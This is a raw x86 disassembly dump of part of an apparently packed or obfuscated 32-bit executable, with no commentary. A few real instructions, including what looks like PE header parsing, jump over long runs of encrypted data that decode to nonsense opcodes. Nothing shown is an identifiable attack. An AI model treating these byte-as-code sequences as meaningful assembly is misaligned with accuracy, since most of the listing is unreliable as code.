  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	dec    eax
  40a3cc:	in     al,0xa4
  40a3ce:	outs   dx,DWORD PTR ds:[esi]
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	xor    bh,BYTE PTR [eax+eax*2]
  40a3da:	inc    esp
  40a3db:	sub    BYTE PTR [ecx],0x98
  40a3de:	xlat   BYTE PTR ds:[ebx]
  40a3df:	xchg   bh,ah
  40a3e1:	xchg   edx,eax
  40a3e2:	push   cs
  40a3e3:	shl    DWORD PTR [eax],cl
  40a3e5:	clc    
  40a3e6:	int3   
  40a3e7:	outs   dx,BYTE PTR ds:[esi]
  40a3e8:	cld    
  40a3e9:	push   ecx
  40a3ea:	xor    ebp,DWORD PTR [edx]
  40a3ec:	inc    edx
  40a3ed:	dec    esi
  40a3ee:	ins    DWORD PTR es:[edi],dx
  40a3ef:	aaa    
  40a3f0:	jo     0x40a3c1
  40a3f2:	pusha  
  40a3f3:	jmp    0x2127074c
  40a3f8:	jg     0x40a42f
  40a3fa:	hlt    
  40a3fb:	cmp    BYTE PTR [ecx+eax*2+0x34],al
  40a3ff:	aam    0x6
  40a401:	imul   ebx,ebp,0x5c
  40a404:	call   edx
  40a406:	dec    edx
  40a407:	call   0xd0bd:0x52342a0b
  40a40e:	adc    al,0x66
  40a410:	jb     0x40a414
  40a412:	int3   
  40a413:	push   ebp
  40a414:	jbe    0x40a3c9
  40a416:	inc    ecx
  40a417:	dec    ebp
  40a418:	mov    ch,BYTE PTR ds:0xdda1bda2
  40a41e:	mov    eax,ds:0xb62959de
  40a423:	test   eax,0x621c5313
  40a428:	mov    ebx,0x2559ab12
  40a42d:	sbb    BYTE PTR [ecx-0x21019e6d],cl
  40a433:	loopne 0x40a4a8
  40a435:	mov    eax,ds:0xb6601ba0
  40a43a:	sub    al,0xa3
  40a43c:	loop   0x40a431
  40a43e:	push   ebx
  40a43f:	push   esp
  40a440:	xchg   ebp,eax
  40a441:	leave  
  40a442:	(bad)  
  40a443:	scas   al,BYTE PTR es:[edi]
  40a444:	test   BYTE PTR [esi+0x77],bl
  40a447:	adc    ch,ch
  40a449:	ds repz xchg esi,eax
  40a44c:	jle    0x40a449
  40a44e:	shl    WORD PTR [esi-0x653b2fd],0x26
  40a456:	sbb    DWORD PTR [esi+eax*4+0x1ed472df],esi
  40a45d:	mov    dh,0x36
  40a45f:	test   BYTE PTR [edi+0x17],al
  40a462:	push   0xffffff97
  40a464:	inc    ebp
  40a465:	jp     0x40a3eb
  40a467:	in     al,dx
  40a468:	adc    bh,BYTE PTR [esi+eiz*8+0x75]
  40a46c:	daa    
  40a46d:	mov    ch,0x29
  40a46f:	mov    edi,0xc8ba5959
  40a474:	xchg   ecx,eax
  40a475:	lea    eax,ds:0xe429f2cb
  40a47b:	(bad)  
  40a47c:	in     eax,0x78
  40a47e:	and    eax,0x89575971
  40a483:	jno    0x40a447
  40a485:	add    BYTE PTR [ebx+eiz*4+0x6ce685e3],0x19
  40a48d:	mov    cl,BYTE PTR [eax-0x48]
  40a490:	xchg   ebx,eax
  40a491:	or     BYTE PTR [esi+0x47],dh
  40a494:	push   cs
  40a495:	loope  0x40a43f
  40a497:	ins    DWORD PTR es:[edi],dx
  40a498:	mov    eax,ds:0x563c87ae
  40a49d:	aaa    
  40a49e:	jmp    0x77bb:0xfd8bd464
  40a4a5:	lds    edx,FWORD PTR [esi-0x429e7a24]
  40a4ab:	inc    edi
  40a4ac:	aaa    
  40a4ad:	lea    ecx,[ebx+0x2b]
  40a4b0:	fist   WORD PTR [si+0xc]
  40a4b4:	sub    BYTE PTR [edx],cl
  40a4b6:	pop    edi
  40a4b7:	ds aad 0x19
  40a4ba:	adc    DWORD PTR [edx-0xe],ecx
  40a4bd:	bound  edx,QWORD PTR [eax-0x2]
  40a4c0:	cli    
  40a4c1:	imul   esp,DWORD PTR [eax],0xc0e598ac
  40a4c7:	test   cl,ch
  40a4c9:	cmp    si,WORD PTR [ebx+0x3f95bedc]
  40a4d0:	pop    ds
  40a4d1:	mov    ?,WORD PTR [ecx+0x8]
  40a4d4:	lods   al,BYTE PTR ds:[esi]
  40a4d5:	and    bl,ch
  40a4d7:	push   ecx
  40a4d8:	iret   
  40a4d9:	mov    al,ds:0xe0220385
  40a4de:	sbb    al,0xbf
  40a4e0:	pop    esi
  40a4e1:	jge    0x40a48b
  40a4e3:	aaa    
  40a4e4:	jbe    0x40a4c0
  40a4e6:	mov    esi,0xc5998470
  40a4eb:	aam    0x28
  40a4ed:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40a4ef:	stos   BYTE PTR es:[edi],al
  40a4f0:	out    0x9b,eax
  40a4f2:	mov    bl,0x96
  40a4f4:	sbb    eax,0x9516a846
  40a4f9:	(bad)  
  40a4fa:	mov    dh,0x38
  40a4fc:	mov    dh,BYTE PTR [eax+0x6d8eb839]
  40a502:	stos   BYTE PTR es:[edi],al
  40a503:	js     0x40a556
  40a505:	sub    DWORD PTR [edi-0x2f],0x0
  40a509:	fstp   st(5)
  40a50b:	cmp    eax,0x101436aa
  40a510:	add    edi,esp
  40a512:	mov    eax,0x68ef78b0
  40a517:	pop    edi
  40a518:	sub    ebx,DWORD PTR [ecx]
  40a51a:	xchg   BYTE PTR ds:0x50999da4,ch
  40a520:	cdq    
  40a521:	cmp    BYTE PTR [ecx],bl
  40a523:	adc    BYTE PTR [edx-0x4a],al
  40a526:	push   ss
  40a527:	and    DWORD PTR [ebx+esi*1-0x3f367b81],0x5704b52f
  40a532:	mov    ch,0x29
  40a534:	(bad)  
  40a535:	xor    al,0x6a
  40a537:	cmp    esi,DWORD PTR [edi+eax*1+0x15]
  40a53b:	out    dx,al
  40a53c:	test   eax,0x53f71eae
  40a541:	mov    al,0x2a
  40a543:	clc    
  40a544:	or     DWORD PTR [ebp-0x45],edx
  40a547:	fdiv   st,st(2)
  40a549:	popf   
  40a54a:	adc    eax,0xf3afd017
  40a54f:	jo     0x40a5a9
  40a551:	rcl    bh,1
  40a553:	push   0x58
  40a555:	xchg   ecx,eax
  40a556:	mov    cl,0xf2
  40a558:	jmp    0x40a571
  40a55a:	into   
  40a55b:	jnp    0x40a4e5
  40a55d:	push   eax
  40a55e:	mov    cl,0xc7
  40a560:	outs   dx,DWORD PTR ds:[esi]
  40a561:	(bad)  
  40a562:	jbe    0x40a550
  40a564:	dec    DWORD PTR [edx+0x47]
  40a567:	pop    ds
  40a568:	dec    ebx
  40a569:	mov    edi,0xb00af90f
  40a56e:	fwait
  40a56f:	xor    dl,cl
  40a571:	data16 aad 0xa
  40a574:	(bad)  
  40a575:	push   ds
  40a576:	and    cl,BYTE PTR [ebp-0x24]
  40a579:	retf   
  40a57a:	sbb    DWORD PTR [ebx+0xe5e38d7],edx
  40a580:	sub    edi,DWORD PTR [edx+0x3b]
  40a583:	xchg   ecx,eax
  40a584:	push   0xc6408c51
  40a589:	pop    eax
  40a58a:	imul   ebx,DWORD PTR [ebx-0x75],0x9ff3ea38
  40a591:	hlt    
  40a592:	call   0xcc08:0x660b1ef0
  40a599:	shl    BYTE PTR [eax],1
  40a59b:	sbb    al,0xb1
  40a59d:	lods   al,BYTE PTR ds:[esi]
  40a59e:	out    dx,eax
  40a59f:	or     esi,DWORD PTR [eax+0x58]
  40a5a2:	push   ds
  40a5a3:	scas   eax,DWORD PTR es:[edi]
  40a5a4:	stos   DWORD PTR es:[edi],eax
  40a5a5:	loop   0x40a59b
  40a5a7:	sbb    bh,BYTE PTR [edi]
  40a5a9:	out    0xd3,al
  40a5ab:	xor    DWORD PTR [eax-0x7ff1ec38],eax
  40a5b1:	push   cs
  40a5b2:	nop
  40a5b3:	mov    dl,0x76
  40a5b5:	push   edx
  40a5b6:	ds cmp dl,dh
  40a5b9:	jle    0x40a5bc
  40a5bb:	int3   
  40a5bc:	das    
  40a5bd:	jno    0x40a58f
  40a5bf:	mov    al,0x4b
  40a5c1:	mov    ebp,0xc99cbca
  40a5c6:	enter  0x8c14,0x45
  40a5ca:	imul   ebp,DWORD PTR [edx+0xe],0xffffffbe
  40a5ce:	jmp    0x63e5bdbe
  40a5d3:	repz mov al,ds:0xe0dfc00d
  40a5d9:	retf   0x5f58
  40a5dc:	xlat   BYTE PTR ds:[ebx]
  40a5dd:	les    eax,FWORD PTR [ebx+0x65]
  40a5e0:	and    BYTE PTR [esi],ch
  40a5e2:	xchg   edx,eax
  40a5e3:	in     al,0xa6
  40a5e5:	mov    ch,0xc5
  40a5e7:	ror    al,cl
  40a5e9:	mov    ds,ecx
  40a5eb:	stc    
  40a5ec:	repz fisub DWORD PTR [eax-0x47713c00]
  40a5f3:	in     al,0xcc
  40a5f5:	lods   al,BYTE PTR ds:[esi]
  40a5f6:	mov    ah,0x4c
  40a5f8:	push   cs
  40a5f9:	sbb    ebx,DWORD PTR [ebp+0x69]
  40a5fc:	retf   
  40a5fd:	sub    BYTE PTR [esi],dh
  40a5ff:	dec    edi
  40a600:	aaa    
  40a601:	mov    edx,DWORD PTR [ecx-0x27]
  40a604:	sub    dh,ch
  40a606:	or     BYTE PTR [edx+0x52],bh
  40a609:	neg    DWORD PTR [edx]
  40a60b:	jp     0x40a63d
  40a60d:	setb   BYTE PTR [eax-0xb765e48]
  40a614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a615:	loope  0x40a61c
  40a617:	push   edx
  40a618:	inc    edi
  40a619:	sbb    eax,0x96f0970d
  40a61e:	jb     0x40a5ae
  40a620:	push   esi
  40a621:	jecxz  0x40a5f8
  40a623:	cmp    BYTE PTR [esi+0x7],0x2c
  40a627:	dec    ebx
  40a628:	cmp    ebp,DWORD PTR [esi+0x2aedde6c]
  40a62e:	int3   
  40a62f:	mov    al,0xd3
  40a631:	jno    0x40a60c
  40a633:	mov    esi,0xd2058366
  40a638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a639:	xchg   ecx,eax
  40a63a:	jmp    0x40a601
  40a63c:	dec    edx
  40a63d:	sub    al,0xdf
  40a63f:	loop   0x40a6b2
  40a641:	cmp    DWORD PTR [eax],edi
  40a643:	adc    al,0x59
  40a645:	xor    ah,dl
  40a647:	in     eax,0x8b
  40a649:	cli    
  40a64a:	iret   
  40a64b:	push   edx
  40a64c:	test   edx,ebx
  40a64e:	sahf   
  40a64f:	(bad)  
  40a650:	(bad)  
  40a652:	mov    al,0x1c
  40a654:	sub    ecx,esp
  40a656:	mov    BYTE PTR [edx+0x63a12207],0x28
  40a65d:	push   eax
  40a65e:	jge    0x40a67a
  40a660:	and    eax,0xae101703
  40a665:	mov    ds:0xceaef454,al
  40a66a:	imul   ecx,ebp,0x66
  40a66d:	inc    esi
  40a66e:	sti    
  40a66f:	enter  0x4995,0xdd
  40a673:	xor    esi,edx
  40a675:	jmp    0x6dd:0x2a7ac9fe
  40a67c:	or     bl,ch
  40a67e:	(bad)  
  40a67f:	fisubr WORD PTR [edx-0x21ef1840]
  40a685:	lahf   
  40a686:	push   ebx
  40a687:	les    esp,FWORD PTR ds:0xfa2f38e
  40a68d:	(bad)  
  40a68e:	or     ah,ch
  40a690:	xchg   edx,eax
  40a691:	push   ss
  40a692:	clc    
  40a693:	and    eax,0xbf7bacb2
  40a698:	dec    ebx
  40a699:	mov    esi,0xf45d7516
  40a69e:	xchg   ecx,eax
  40a69f:	ins    BYTE PTR es:[edi],dx
  40a6a0:	inc    esp
  40a6a1:	jbe    0x40a6e2
  40a6a3:	(bad)  
  40a6a5:	and    al,bh
  40a6a7:	ss dec ebp
  40a6a9:	lea    esp,[eax]
  40a6ab:	jl     0x40a70f
  40a6ad:	sahf   
  40a6ae:	xchg   DWORD PTR ds:0xeba4fabe,esi
  40a6b4:	or     eax,0x3e7be952
  40a6b9:	cmp    DWORD PTR [esi+0x41d97ddf],esi
  40a6bf:	add    BYTE PTR [ebx-0xcb16fb8],al
  40a6c5:	test   eax,0x4de746f4
  40a6ca:	fild   WORD PTR [edx+0x5a]
  40a6cd:	aas    
  40a6ce:	adc    dl,BYTE PTR [ecx-0x24]
  40a6d1:	lods   eax,DWORD PTR ds:[esi]
  40a6d2:	cld    
  40a6d3:	leave  
  40a6d4:	(bad)  
  40a6d5:	ins    DWORD PTR es:[edi],dx
  40a6d6:	inc    ebx
  40a6d7:	pop    ebp
  40a6d8:	or     ebp,DWORD PTR [esp+edx*1]
  40a6db:	add    eax,edi
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4-0x2d]
  40a6ef:	sub    dl,bl
  40a6f1:	sar    DWORD PTR [eax-0x17],cl
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	xor    al,0xdd
  40a6fc:	pop    ebx
  40a6fd:	cwde   
  40a6fe:	jmp    0xcd313540
  40a703:	mov    dl,0x5
  40a705:	aaa    
  40a706:	cli    
  40a707:	jle    0x40a6dd
  40a709:	mov    ds:0x42178d5a,eax
  40a70e:	jge    0x40a777
  40a710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a711:	jle    0x40a704
  40a713:	das    
  40a714:	icebp  
  40a715:	rcl    DWORD PTR [edx-0x2e4c599],1
  40a71b:	aas    
  40a71c:	fwait
  40a71d:	adc    ecx,DWORD PTR [ecx-0x40826c96]
  40a723:	xor    DWORD PTR [eax],eax
  40a725:	nop
  40a726:	adc    eax,0xe53d9a3e
  40a72b:	out    dx,al
  40a72c:	iret   
  40a72d:	mov    ebp,0x2047e1c6
  40a732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a733:	dec    esp
  40a734:	mov    bh,0xa1
  40a736:	retf   
  40a737:	jp     0x40a6e2
  40a739:	or     dh,BYTE PTR ds:0x831899a7
  40a73f:	and    DWORD PTR [ebp+0x6081afb1],ebp
  40a745:	adc    BYTE PTR [ebp+0x6d6b37e6],bl
  40a74b:	(bad)  
  40a74c:	out    dx,eax
  40a74d:	dec    esi
  40a74e:	dec    edi
  40a74f:	push   cs
  40a750:	xchg   esi,eax
  40a751:	dec    esp
  40a752:	ret    
  40a753:	cmp    eax,0x541b7cf
  40a758:	mov    cs,WORD PTR [ecx+0x59c270d3]
  40a75e:	mov    dl,0x24
  40a760:	jmp    0x2c3b:0x77f0d742
  40a767:	cmp    DWORD PTR ds:0x72ab2e1b,0xffffffdb
  40a76e:	xchg   edi,eax
  40a76f:	mov    cl,0x57
  40a771:	sub    DWORD PTR [eax-0xa5345a0],0xffffffb0
  40a778:	repnz loope 0x40a774
  40a77b:	xchg   BYTE PTR [ebx-0x50],dh
  40a77e:	loope  0x40a73e
  40a780:	and    al,0x3a
  40a782:	or     DWORD PTR [edx+eiz*8],0xd5fb0c68
  40a789:	imul   esi,DWORD PTR [ebp-0x6c],0xcbfda5c7
  40a790:	cmc    
  40a791:	and    al,0xd8
  40a793:	dec    ebp
  40a794:	mov    cl,0x5c
  40a796:	adc    DWORD PTR [edi+0x61],esi
  40a799:	clc    
  40a79a:	xor    DWORD PTR [ebx],ecx
  40a79c:	int    0x49
  40a79e:	adc    eax,0xbdbb9b63
  40a7a3:	jbe    0x40a737
  40a7a5:	sub    BYTE PTR [esi+ebp*1-0x6f],0x91
  40a7aa:	jge    0x40a7d7
  40a7ac:	mov    ebp,0x65bcb32b
  40a7b1:	sbb    eax,0x45c9c2e6
  40a7b6:	dec    ebx
  40a7b7:	adc    edx,edi
  40a7b9:	add    DWORD PTR [edx+0x2d],ebp
  40a7bc:	repz sbb ah,dh
  40a7bf:	sahf   
  40a7c0:	test   DWORD PTR [ebp+0x47d26278],edx
  40a7c6:	inc    esp
  40a7c7:	retf   
  40a7c8:	je     0x40a781
  40a7ca:	je     0x40a751
  40a7cc:	sbb    esi,ebx
  40a7ce:	in     al,dx
  40a7cf:	sub    al,0xec
  40a7d1:	sub    DWORD PTR [edi],0xdbe242
  40a7d7:	jmp    0x40a84e
  40a7d9:	adc    al,0x7a
  40a7db:	mov    ds:0x7113e660,eax
  40a7e0:	or     ah,BYTE PTR [eax+ebx*8]
  40a7e3:	add    esi,0xa3b6d138
  40a7e9:	je     0x40a85c
  40a7eb:	adc    esp,DWORD PTR [eax-0x301688e4]
  40a7f1:	xchg   ebp,eax
  40a7f2:	stos   DWORD PTR es:[edi],eax
  40a7f3:	or     al,BYTE PTR [edi+0x1fd32df3]
  40a7f9:	and    DWORD PTR [ebx],ebp
  40a7fb:	jmp    0xa2a76de3
  40a800:	jecxz  0x40a806
  40a802:	imul   edi,DWORD PTR [ecx+0x59],0xd5fe05e6
  40a809:	pusha  
  40a80a:	ud2    
  40a80c:	adc    DWORD PTR [eax],0xffffffd2
  40a80f:	xchg   edx,eax
  40a810:	mul    ebp
  40a812:	xchg   DWORD PTR [esi+0x176ee706],eax
  40a818:	xchg   ebx,eax
  40a819:	call   0x3d0d4ed2
  40a81e:	add    bl,BYTE PTR [edx]
  40a820:	cdq    
  40a821:	xchg   esi,eax
  40a822:	pop    ss
  40a823:	push   eax
  40a824:	mov    eax,ds:0x80a9f2de
  40a829:	sbb    eax,0xe19ff218
  40a82e:	(bad)  
  40a82f:	cmc    
  40a830:	sbb    DWORD PTR [ebx+edx*4],0x77
  40a834:	imul   ebx,DWORD PTR [ebp+0x7b6ae238],0xf2b8375d
  40a83e:	sub    eax,0x8db40517
  40a843:	jl     0x40a8a0
  40a845:	loope  0x40a849
  40a847:	add    al,0x8a
  40a849:	mov    dh,0xbb
  40a84b:	push   ebp
  40a84c:	imul   esi,DWORD PTR [esi+0x4],0xf4e8bb2c
  40a853:	jnp    0x40a805
  40a855:	pop    ds
  40a856:	adc    ecx,DWORD PTR [esi]
  40a858:	cmp    bh,al
  40a85a:	rol    DWORD PTR [ebp-0x6cdb7b31],cl
  40a860:	repz lea edi,[ecx+ebx*4-0x7495f07]
  40a868:	adc    al,0xe7
  40a86a:	out    0xde,al
  40a86c:	xor    BYTE PTR [ebp+0x304a9ae3],ah
  40a872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a873:	cmp    edx,DWORD PTR [esi]
  40a875:	ins    BYTE PTR es:[edi],dx
  40a876:	xchg   esp,eax
  40a877:	test   al,0x78
  40a879:	fidiv  WORD PTR [edx-0x700c1f1]
  40a87f:	inc    eax
  40a880:	bound  esi,QWORD PTR [esi]
  40a882:	test   BYTE PTR [ebx],0x5d
  40a885:	cmp    dl,BYTE PTR [edi]
  40a887:	pop    es
  40a888:	jnp    0x40a822
  40a88a:	jge    0x40a883
  40a88c:	mov    WORD PTR cs:[ebx-0x4b9f1d37],fs
  40a893:	cmp    BYTE PTR [ebx-0x38],dl
  40a896:	xchg   ebp,eax
  40a897:	xchg   DWORD PTR [ebx],esp
  40a899:	add    ebp,DWORD PTR ds:0xdc50de8f
  40a89f:	add    ah,BYTE PTR [edx-0x796cfdc2]
  40a8a5:	repnz sub eax,DWORD PTR [edx+0x6c]
  40a8a9:	lods   al,BYTE PTR ds:[esi]
  40a8aa:	lock pop ds
  40a8ac:	shl    DWORD PTR [esi-0xdd09fad],cl
  40a8b2:	mov    esp,0xea3ddae2
  40a8b7:	jne    0x40a849
  40a8b9:	push   ds
  40a8ba:	pop    ecx
  40a8bb:	push   edi
  40a8bc:	push   ds
  40a8bd:	outs   dx,BYTE PTR ds:[esi]
  40a8be:	inc    eax
  40a8bf:	fs mov ecx,0x1da271a6
  40a8c5:	jb     0x40a928
  40a8c7:	es std 
  40a8c9:	lods   eax,DWORD PTR ds:[esi]
  40a8ca:	inc    eax
  40a8cb:	(bad)  [edx+0x21d51865]
  40a8d1:	(bad)  
  40a8d2:	and    BYTE PTR [edx],bl
  40a8d4:	(bad)  
  40a8d6:	hlt    
  40a8d7:	shl    ah,1
  40a8d9:	add    DWORD PTR [esi],ebx
  40a8db:	mov    ecx,0xfcd35af3
  40a8e0:	jo     0x40a8b9
  40a8e2:	icebp  
  40a8e3:	in     eax,dx
  40a8e4:	sub    DWORD PTR [ecx+esi*1-0x6d],0x13
  40a8e9:	leave  
  40a8ea:	std    
  40a8eb:	mov    bl,0xde
  40a8ed:	dec    ecx
  40a8ee:	ret    
  40a8ef:	cwde   
  40a8f0:	push   ebp
  40a8f1:	lea    ebx,[eax+0x2090b99d]
  40a8f7:	stos   DWORD PTR es:[edi],eax
  40a8f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f9:	nop
  40a8fa:	sahf   
  40a8fb:	pusha  
  40a8fc:	xchg   ebx,eax
  40a8fd:	mov    eax,0xed99583f
  40a902:	mov    es:0x1fbf7223,eax
  40a908:	rcr    BYTE PTR [esi],0xb6
  40a90b:	jae    0x40a957
  40a90d:	and    eax,0x86859c19
  40a912:	addr16 pop ecx
  40a914:	les    ebp,FWORD PTR [esi-0x6c]
  40a917:	or     DWORD PTR [edi-0x890dc24],ecx
  40a91d:	pop    esi
  40a91e:	xor    ah,BYTE PTR [ecx-0x80]
  40a921:	js     0x40a923
  40a923:	fsub   st(7),st
  40a925:	mov    esi,0xcea711f4
  40a92a:	enter  0x1b0c,0x23
  40a92e:	sbb    BYTE PTR [edi+eax*2],ah
  40a931:	rcr    DWORD PTR [ecx-0x4a],cl
  40a934:	lahf   
  40a935:	leave  
  40a936:	and    dh,cl
  40a938:	ja     0x40a94d
  40a93a:	dec    ecx
  40a93b:	addr16 sti 
  40a93d:	sub    al,0x4
  40a93f:	xor    BYTE PTR [edx-0x67f12783],ah
  40a945:	jg     0x40a933
  40a947:	std    
  40a948:	xor    ebx,DWORD PTR [ebp+0x6b]
  40a94b:	cdq    
  40a94c:	fbld   TBYTE PTR [edx-0x18]
  40a94f:	bound  ecx,QWORD PTR [ecx]
  40a951:	stos   BYTE PTR es:[edi],al
  40a952:	mov    BYTE PTR [edi-0x67],cl
  40a955:	not    BYTE PTR [esi-0x23]
  40a958:	aam    0x9a
  40a95a:	arpl   WORD PTR [edx+ebx*4-0x2],cx
  40a95e:	sub    al,0x77
  40a960:	out    dx,eax
  40a961:	lods   al,BYTE PTR ds:[esi]
  40a962:	cmp    al,ch
  40a964:	ja     0x40a980
  40a966:	mov    BYTE PTR [ebp+0x504eb3a1],cl
  40a96c:	fs push ss
  40a96e:	popa   
  40a96f:	mov    dl,0x20
  40a971:	and    BYTE PTR [esi-0x40b425f6],dh
  40a977:	out    dx,al
  40a978:	pop    esp
  40a979:	hlt    
  40a97a:	push   ds
  40a97b:	popa   
  40a97c:	mov    dh,0xed
  40a97e:	xchg   esi,eax
  40a97f:	lock int 0x11
  40a982:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a984:	in     al,dx
  40a985:	jmp    0x40a916
  40a987:	inc    ebp
  40a988:	mov    al,ds:0x7259a476
  40a98d:	mov    BYTE PTR [eax],dl
  40a98f:	stc    
  40a990:	jo     0x40a9dd
  40a992:	rol    DWORD PTR [ecx-0x3b],0x8f
  40a996:	mov    ebp,0x8564b2ff
  40a99b:	les    edi,FWORD PTR [esi+edi*1+0x34e96a9e]
  40a9a2:	add    dh,BYTE PTR ds:0xc906a012
  40a9a8:	mov    bh,0xde
  40a9aa:	jecxz  0x40a95a
  40a9ac:	push   cs
  40a9ad:	daa    
  40a9ae:	leave  
  40a9af:	(bad)  
  40a9b0:	jnp    0x40a950
  40a9b2:	ret    0xea36
  40a9b5:	js     0x40a993
  40a9b7:	add    ebp,edi
  40a9b9:	mov    ebx,0xf2fb32e7
  40a9be:	repnz push 0x73
  40a9c1:	(bad)  
  40a9c2:	mov    eax,0x3b51827e
  40a9c7:	aad    0x68
  40a9c9:	jmp    0x7736746f
  40a9ce:	test   DWORD PTR [edi+0x12],edx
  40a9d1:	hlt    
  40a9d2:	or     eax,0xed503733
  40a9d7:	ins    DWORD PTR es:[edi],dx
  40a9d8:	ret    
  40a9d9:	sbb    dl,BYTE PTR [eax]
  40a9db:	out    dx,eax
  40a9dc:	sbb    DWORD PTR [ebp+0x4e],esi
  40a9df:	js     0x40aa4c
  40a9e1:	out    dx,eax
  40a9e2:	dec    esi
  40a9e3:	pop    esi
  40a9e4:	test   DWORD PTR [edx-0x73],eax
  40a9e7:	or     al,0x6b
  40a9e9:	pop    esp
  40a9ea:	pop    esp
  40a9eb:	out    0x2a,al
  40a9ed:	repnz add ah,ah
  40a9f0:	mov    edx,0x95a4d1f2
  40a9f5:	(bad)  
  40a9f6:	and    DWORD PTR ds:0x6fb7686d,edi
  40a9fc:	clc    
  40a9fd:	pop    eax
  40a9fe:	cmp    DWORD PTR [ecx],eax
  40aa00:	je     0x40ba28
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [edi-0x9],edx
  40aa2b:	pop    edi
  40aa2c:	fld    QWORD PTR [esp+esi*8]
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	stc    
  40aa36:	shl    BYTE PTR [esi-0x1b],cl
  40aa39:	push   eax
  40aa3a:	fxch   st(7)
  40aa3c:	scas   al,BYTE PTR es:[edi]
  40aa3d:	push   edx
  40aa3e:	mov    cl,BYTE PTR [edi+ebp*1-0x2c]
  40aa42:	inc    ebp
  40aa43:	inc    edx
  40aa44:	mov    WORD PTR [ecx],?
  40aa46:	xchg   DWORD PTR [ebp+0x24],ecx
  40aa49:	jbe    0x40aa14
  40aa4b:	mov    bh,0x3a
  40aa4d:	inc    esi
  40aa4e:	lods   eax,DWORD PTR ds:[esi]
  40aa4f:	mov    esi,0xa4e83f8a
  40aa54:	mov    esi,0x94b54981
  40aa59:	add    bl,BYTE PTR [edx-0x50]
  40aa5c:	jns    0x40a9ec
  40aa5e:	push   ebp
  40aa5f:	retf   
  40aa60:	js     0x40aaa1
  40aa62:	xchg   esi,eax
  40aa63:	nop
  40aa64:	add    esi,DWORD PTR [esi-0x4e3d1293]
  40aa6a:	or     cl,bh
  40aa6c:	jge    0x40aa09
  40aa6e:	clc    
  40aa6f:	cmovbe edi,ebx
  40aa72:	mov    al,BYTE PTR [ebx+0x46bf0f86]
  40aa78:	inc    DWORD PTR [edi+0x5a7ef46b]
  40aa7e:	outs   dx,DWORD PTR ds:[esi]
  40aa7f:	inc    ebx
  40aa80:	xchg   esp,eax
  40aa81:	icebp  
  40aa82:	das    
  40aa83:	fst    QWORD PTR [eax]
  40aa85:	or     dl,dh
  40aa87:	cmp    al,0x62
  40aa89:	sbb    ecx,DWORD PTR [ebx]
  40aa8b:	mov    edx,0x2d396055
  40aa90:	gs mov edi,0x7793029d
  40aa96:	cmp    BYTE PTR [ebx+ecx*2-0x78bf2f5e],0x8b
  40aa9e:	push   es
  40aa9f:	imul   edi,edi,0xa3f91d39
  40aaa5:	jnp    0x40aacd
  40aaa7:	in     eax,dx
  40aaa8:	stos   BYTE PTR es:[edi],al
  40aaa9:	xchg   ecx,eax
  40aaaa:	pop    edx
  40aaab:	pop    edi
  40aaac:	out    0xda,eax
  40aaae:	out    dx,eax
  40aaaf:	(bad)  
  40aab0:	xlat   BYTE PTR ds:[ebx]
  40aab1:	test   DWORD PTR [ebx+0x51c2017],ecx
  40aab7:	and    DWORD PTR [ebx-0x381e79f9],edx
  40aabd:	and    ah,BYTE PTR [esi]
  40aabf:	mov    edx,0x785974bd
  40aac4:	ja     0x40ab10
  40aac6:	push   cs
  40aac7:	adc    DWORD PTR [edx],edx
  40aac9:	lods   eax,DWORD PTR ds:[esi]
  40aaca:	or     al,0xfc
  40aacc:	fdiv   QWORD PTR ds:0x2f0257e5
  40aad2:	mov    ds:0x3d01b417,al
  40aad7:	or     ch,cl
  40aad9:	aam    0x49
  40aadb:	or     ah,BYTE PTR [esi-0x3b]
  40aade:	mov    ecx,0x699d7769
  40aae3:	add    al,0x82
  40aae5:	xchg   DWORD PTR [ecx],ebx
  40aae7:	test   DWORD PTR [ebx+0x36b0fff8],esi
  40aaed:	mov    al,ds:0xdb47ea06
  40aaf2:	imul   DWORD PTR [edx-0x31]
  40aaf5:	inc    edx
  40aaf6:	xor    DWORD PTR ds:[ebp-0x1f4520c5],edi
  40aafd:	xor    bh,BYTE PTR [eax+0x271013b7]
  40ab03:	sar    DWORD PTR [eax],cl
  40ab05:	sub    ecx,DWORD PTR [eax-0x4032ab32]
  40ab0b:	add    ch,cl
  40ab0d:	xchg   ebx,eax
  40ab0e:	clc    
  40ab0f:	push   ebx
  40ab10:	ja     0x40ab59
  40ab12:	std    
  40ab13:	popa   
  40ab14:	add    BYTE PTR [ebx+0x4a],ah
  40ab17:	sahf   
  40ab18:	add    al,0x32
  40ab1a:	mov    dl,0xcd
